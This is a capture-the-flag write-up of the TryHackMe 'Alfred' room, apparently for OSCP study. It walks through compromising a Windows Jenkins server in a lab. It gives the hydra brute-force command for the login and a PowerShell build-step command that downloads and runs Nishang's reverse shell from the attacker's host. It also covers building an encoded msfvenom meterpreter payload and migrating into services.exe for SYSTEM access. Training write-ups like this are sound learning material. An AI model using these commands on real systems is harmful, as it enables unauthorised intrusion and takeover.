# Alfred TryHackMe Writeup #
## Preface ##
Since beginning to prepare for the OSCP I have periodically bounced back and forth on my study habits which is not condusive to a smooth study experience or successful exam attempt. As I begin my refresher before beginning much more serious work I have been working through rooms I exploited before, with Alfred being the first room I did that had me scratching my head the first time. I hope this writeup helps you in the event you get stuck as I did.

## Enumeration Phase ##

Since TryHackMe (THM) provide us with the knowledge of this being a Windows device running Jenkins, this gives us an advantage when it comes to enumeration. This knowledge narrows down the first wave of enumeration we will have to perform with the first being an nmap scan to determine the ports and services running.

This can be achieved by running the command ```sudo nmap 10.10.69.30 -Pn -p 1-9999```  which gives us three live ports which are:
| Port | Protocol | Service |
|-----:|----------|---------|
|    80|       TCP|     HTTP|
|  3389|       TCP| MS-WBT-Server|
|  8080|       TCP|   HTTP-PROXY|
 
![NMAP Enumeration](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028174616.png)

Now that we have this information lets visit the open http ports to see what is available to us starting with 10.10.69.30:80 which just gives us a page with an image of Bruce Wayne.

![Port 80 Access](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028175000.png) 

We will now visit 10.10.69.30:8080 where we are presented with a Jenkins login page. 
![Port 8080 Access](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028175054.png) 

## Initial Access ##

We do not have the password so we can do some searching for Jenkins default passwords where we can see 12345 is a common one, but upon trying it we are unsuccessful, but the Burp Proxy gives us some useful information. 
![Burp Proxy](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028181138.png)

Now that we have a login value we need to craft  a hydra payload to run against the endpoint to bruteforce this login. When running hydra from your wordlist directory the command should look something like this:  `hydra -L fasttrack.txt -P fasttrack.txt 10.10.69.30 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&form=%2F&Submit=Sign+in:loginError"`  Which will take a little while to run against the endpoint so be patient. 
![Hydra Initialization](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028183503.png) 

By utilizing Hydra we see a successful login with the username admin and the password admin. 
![Hydra Success](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028190601.png)

Now that we have this login information we need to log in and be greeted with the Jenkins GUI where we see an existing project as well as the admin username showing the account we logged in under. 
![Jenkins Access](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028190845.png)

We can see that the version is Jenkins 2.190.1 so we need to reseach the functionality of Jenkins to begin getting an idea of what it does which allows us to find ways to exploit it. This should have pointed you toward Jenkins being an automation platform that facilitates Continuous Integration (CI) and in theory will have jobs that are either manually triggered or automatically triggered to execute some function. Once you know this you can then move on to using the tool that THM recommends which is Nishang, specifically the Invoke-PowerShellTcp.ps1 script inside the Nishang package.

Jenkins allows us to execute Windows batch commands on the host running the service which will allow us to pull down the PowerShell script from our machine into the Windows device where it will be executed. Upon execution our listener should pick up giving us a reverse shell. 

Once you load into the project and go into the configuration you will then find a section named build that will allow you to input a command. This will be useful to achieve initial access once we spin up a simplehttp server using the python command `python -m http.server 8000`  This will create a reachable network location for our exploit to be pulled from. We will also want to initiate a listener on port 4444 using the command `rlwrap nc -lvnp 4444` Now that we have a listener running we can push the command to the device through Jenkins by building a project containing `powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.4.233:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.4.233 -Port 4444` 
![Reverse Shell Execution](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028213828.png)

You will now have a reverse shell into the device where you can use `whoami` to verify your role and begin looking for the first flag.
![Reverse Shell Establoshed](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028213936.png) 
![Flag Achieved](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028214328.png) 

## Privilege Escalation ##

Now that we have that initial shell we need to escalate our privileges to look for even more flags that may be under administrator accounts. This exercise has us using Metasploit and meterpreter in particular.

We will first need to create our payload using msfvenom which will be generated via the command `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.4.233 LPORT=4445 -f exe -o revshell.exe` 
![MSFVenom Payload Creation](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028221202.png)

Before we build the project we will first need to get Metasploit ready by starting the postgresql service via `service postgresql start` and then running the `msfconsole` command.

Once Metasploit is launch we first need to perform a few steps before we push the exploit and begin attempting to elevate our privileges.
1. `use exploit/multi/handler`
2. `set PAYLOAD windows/meterpreter/reverse_tcp`
3. `set LHOST 10.6.4.233`
4. `set LPORT 4445`
5. `run`
This has us listening for the exploit to be sent and allowing the payload to execute.
![MSFConsole Setup](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028221944.png)

Now that we have this ready we will build our exploit command in Jenkins which will be `powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.6.4.233:8000/revshell.exe','revshell.exe')"` 
![Jenkins Payload Retrieval](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028222440.png)

Once we have pushed that command from Jenkins we will want to use the `Start-Process "revshell.exe"` command from the reverse shell in the project/workspace folder to initiate the exploit. 
![Exploit Initialization](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028223121.png)

This should now allow the Meterpreter shell to begin connecting, opening the pathway to privilege escalation. 
![Meterpreter Launch](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028223212.png)

With the Meterpreter shell running it's pretty simple to elevate privileges by using the `getsystem` command which will utilize an impersonation token, preventing us from being able to explore for the root.txt flag. To truly escalate our privileges to root then we will need to look for any service that would be running under the `NT\AUTHORITY` token since this is a Windows device. A usual suspect for this would be `services.exe` so we will use `ps` to list all processes and look for the PID of `services.exe`. 
![Process Listing](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028224117.png)

Now that we have listed all of the running processes we can migrate to the `services.exe` process which is running as `NT\AUTHORITY` and search for the flag which can be done a few ways but the easiest way will be to utilize `search -f root.txt` to determine the location of the flag then using the `shell` command to launch the Windows terminal where you can use `cd C:\Windows\System32\config` to navigate to the directory housing the flag and finally use `more root.txt` to read the flag completing the exercise.
![Process Migration](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028224629.png) 
![Root Flag](https://github.com/J0hnStr0ng/THM-Alfred-Writeup/blob/main/images/Pasted%20image%2020221028224954.png) 
